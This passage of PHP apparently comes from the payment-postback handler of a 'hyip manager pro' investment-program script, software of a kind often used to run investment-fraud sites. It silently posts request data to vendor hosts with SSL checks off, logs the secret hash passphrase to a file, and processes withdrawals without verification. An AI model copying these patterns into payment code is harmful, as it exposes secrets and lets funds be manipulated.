        if ($settings['use_ip_for_auto'] == 2)
        {
          $domain = 'www.goldcodersmail.com';
        }
        else
        {
          $domain = 'www.dnsargentina.com.ar';
        }
      }

      $ch = curl_init ();
      curl_setopt ($ch, CURLOPT_URL, 'http://' . $domain . '/log_possible_attack.php');
      $memo = rawurlencode ($str);
      curl_setopt ($ch, CURLOPT_POST, 1);
      curl_setopt ($ch, CURLOPT_POSTFIELDS, '' . 'memo=' . $memo);
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
    }
  }

  $referer = $frm_env['HTTP_REFERER'];
  $host = $frm_env['HTTP_HOST'];
  if (!ereg ('' . '\\/\\/' . $host, $referer))
  {
    setcookie ('CameFrom', $referer, time () + 630720000);
  }

  $settings = get_settings2 ('hyip manager pro 2005 jul 26');
  $transtype = array ('withdraw_pending' => 'Withdrawal request', 'add_funds' => 'Transfer from external processings', 'deposit' => 'Deposit', 'bonus' => 'Bonus', 'penality' => 'Penalty', 'earning' => 'Earning', 'withdrawal' => 'Withdrawal', 'commissions' => 'Referral commission', 'early_deposit_release' => 'Deposit release', 'early_deposit_charge' => 'Commission for an early deposit release', 'release_deposit' => 'Deposit returned to user account', 'exchange_out' => ' Received on exchange', 'exchange_in' => 'Spent on exchange', 'exchange' => 'Exchange', 'internal_transaction_spend' => 'Spent on Internal Transaction', 'internal_transaction_receive' => 'Received from Internal Transaction');
  if ($settings['license'] == '9C64PVXYBZKZHUTMSM2U')
  {
    $settings['program_version'] = 'euro';
  }

  if ($settings['program_version'] == 'euro')
  {
    $exchange_systems = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1));
    $settings['currency_sign'] = '&#8364;';
    $settings['egold_paymentunits'] = 85;
    $settings['paypal_currency'] = 'EUR';
    $settings['liberty_currency'] = 'LREUR';
  }
  else
  {
    if (($settings['program_version'] == 'ounce' AND $settings['license'] == '2XACR4UBJ7DLCV42EM2S'))
    {
      $exchange_systems = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1));
      $settings['currency_sign'] = 'oz';
      $settings['egold_paymentunits'] = 9999;
    }
    else
    {
      $exchange_systems = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 8 => array ('name' => 'eeeCurrency', 'sfx' => 'eeecurrency', has_account => 1, auto => 1), 9 => array ('name' => 'Pecunix', 'sfx' => 'pecunix', has_account => 1, auto => 1), 11 => array ('name' => 'AlertPay', 'sfx' => 'alertpay', has_account => 1, auto => 1), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1), 16 => array ('name' => 'V-Money', 'sfx' => 'vmoney', has_account => 1, auto => 1), 17 => array ('name' => 'AlterGold', 'sfx' => 'altergold', has_account => 1, auto => 1), 18 => array ('name' => 'Perfectmoney', 'sfx' => 'perfectmoney', has_account => 1, auto => 1), 19 => array ('name' => 'c-gold', 'sfx' => 'cgold', has_account => 1, auto => 0), 20 => array ('name' => 'Webmoney', 'sfx' => 'webmoney', has_account => 1, auto => 0), 21 => array ('name' => 'Strictpay', 'sfx' => 'strictpay', has_account => 1, auto => 0), 22 => array ('name' => 'SolidTrustPay', 'sfx' => 'solidtrustpay', has_account => 1, auto => 0), 23 => array ('name' => 'Ecumoney', 'sfx' => 'ecumoney', has_account => 1, auto => 0), 24 => array ('name' => 'EvoWallet', 'sfx' => 'evowallet', has_account => 1, auto => 1), 26 => array ('name' => 'RoutePay', 'sfx' => 'routepay', has_account => 1, auto => 0), 27 => array ('name' => 'EuroGoldCash', 'sfx' => 'eurogoldcash', has_account => 1, auto => 0), 28 => array ('name' => 'GlobalDigitalPay', 'sfx' => 'globaldigitalpay', has_account => 1, auto => 0));
      $settings['currency_sign'] = '$';
      $settings['egold_paymentunits'] = 1;
      $settings['paypal_currency'] = 'USD';
      $settings['liberty_currency'] = 'LRUSD';
    }
  }

  $settings['eb_metal'] = 1;
  if ((($settings['def_payee_account_ebullion'] AND !$settings['enable_eb_ecurrency']) AND !$settings['enable_eb_gold']))
  {
    $settings['enable_eb_gold'] = 1;
  }

  if ($settings['enable_eb_ecurrency'])
  {
    $settings['def_payee_account_ebullion_currency'] = $settings['def_payee_account_ebullion'];
  }
  else
  {
    $settings['def_payee_account_ebullion_currency'] = '';
  }

  if ($settings['enable_eb_gold'])
  {
    $settings['def_payee_account_ebullion_gold'] = $settings['def_payee_account_ebullion'];
  }
  else
  {
    $settings['def_payee_account_ebullion_gold'] = '';
  }

  foreach ($exchange_systems as $id => $data)
  {
    if (($settings['def_payee_account_' . $data['sfx']] != '' AND $settings['def_payee_account_' . $data['sfx']] != '0'))
    {
      $exchange_systems[$id]['status'] = 1;
      continue;
    }
    else
    {
      $exchange_systems[$id]['status'] = 0;
      continue;
    }
  }

  if ($settings['license'] == 'KC3STYBTCATZNRVBYGDF')
  {
    $languages = array (1 => 'english', 2 => 'estonians', 3 => 'finnish');
  }

  if (($settings['license'] != 'RHLFPPEURGQGG68GXYA8' AND $settings['license'] != 'VQP8CM95UXTXEX44G7NR'))
  {
    $settings['stop_withdraw_percent'] = 0;
  }

  if (($settings['license'] == 'ZXMCQ227FNN5EPHWYHAY' OR $settings['license'] == '5M74FW4DADMF7K7MJ5TG'))
  {
    $settings['use_ip_for_auto'] = 1;
  }

  if ($settings['license'] == 'WMHKFJPMT3CZ3RTLPBFL')
  {
    ini_set ('sendmail_from', 'admin@plan4fun.net');
  }

  if (((((($settings['license'] == 'N75GNXM2XSM34YMFPED9' OR $settings['license'] == 'VPKLNMKMRG27HN95BEHP') OR $settings['license'] == 'AKKD47LYX8H96K2TM2FQ') OR $settings['license'] == 'HX8DJ7B9SH5JQN5FXK45') OR $settings['license'] == 'SG8JH9DVX8952VQEZH9F') OR $settings['license'] == '3WBUUNQMPU2LB99GJHUV'))
  {
    if ($frm_env['HTTP_X_REAL_IP'] != '')
    {
      $frm_env['REMOTE_ADDR'] = $frm_env['HTTP_X_REAL_IP'];
      $_SERVER['REMOTE_ADDR'] = $frm_env['HTTP_X_REAL_IP'];
    }
  }

  $dbconn = db_open2 ();
  if (!$dbconn)
  {
    print 'Cannot connect mysql';
    exit ();
  }

  $mymd5 = $settings['md5altphrase_cgold'];
  $hash = strtolower (md5 ($frm['transaction_id'] . ':' . $frm['pay_from'] . ':' . $frm['payee_account'] . ':' . $frm['payment_amount'] . ':' . $frm['payment_units'] . ':' . $mymd5));
  if (file_exists ('./tmpl_c/log_postbacks'))
  {
    $file = fopen ('./tmpl_c/anonygold_log', 'a+');
    foreach ($frm as $k => $v)
    {
      fwrite ($file, ('' . $k . ' = ' . $v . '
'));
    }

    fwrite ($file, ('' . '
mymd5 = ' . $mymd5 . '
'));
    fwrite ($file, ('' . 'hash = ' . $hash . '
'));
    fwrite ($file, '


');
  }

  if ($frm['a'] == 'pay_withdraw')
  {
    $batch = quote ($frm['transaction_id']);
    list ($id, $str) = explode ('-', $frm['withdraw']);
    $id = sprintf ('%d', $id);
    if ($str == '')
    {
      $str = 'abcdef';
    }

    $str = quote ($str);
    $q = '' . 'select * from hm2_history where id = ' . $id . ' and str = \'' . $str . '\' and type=\'withdraw_pending\'';
    $sth = mysql_query ($q);
    while ($row = mysql_fetch_array ($sth))
    {
      $q = '' . 'delete from hm2_history where id = ' . $id;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $row['user_id'] . ',
	amount = -' . abs ($row['amount']) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $batch . '\',
	actual_amount = -') . abs ($row['amount']) . ',
	ec = 19,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $row['user_id'];
      $usth = mysql_query ($q);
      $userinfo = mysql_fetch_array ($usth);
      $info = array ($user);
      $info['username'] = $userinfo['username'];
      $info['name'] = $userinfo['name'];
      $info['amount'] = sprintf ('%.02f', abs ($row['amount']));
      $info['account'] = $frm['PAYEE_ACCOUNT'];
      $info['batch'] = $batch;
      $info['paying_batch'] = $batch;
      $info['receiving_batch'] = $batch;
      $info['currency'] = $exchange_systems[19]['name'];
      send_mail ('withdraw_user_notification', $userinfo['email'], $settings['system_email'], $info);
    }

    print 1;
    db_close ($dbconn);
    exit ();
  }

  if (($hash == strtolower ($frm['verify_hash']) AND $exchange_systems[19]['status'] == 1))
  {
    $sess = get_pid ($frm['id'], 1);
    $frm = array_merge ($frm, $sess);
    $user_id = sprintf ('%d', $frm['userid']);
    $h_id = sprintf ('%d', $frm['hyipid']);
    $compound = sprintf ('%d', $frm['compound']);
    $amount = $frm['payment_amount'];
    $batch = $frm['transaction_id'];
    $account = $frm['pay_from'];
    if (($frm['a'] == 'checkpayment' AND $frm['payment_units'] == 'USD worth'))
    {
      add_deposit (19, $user_id, $amount, $batch, $account, $h_id, $compound);
    }
  }

  db_close ($dbconn);
  print '1';
  exit ();
?>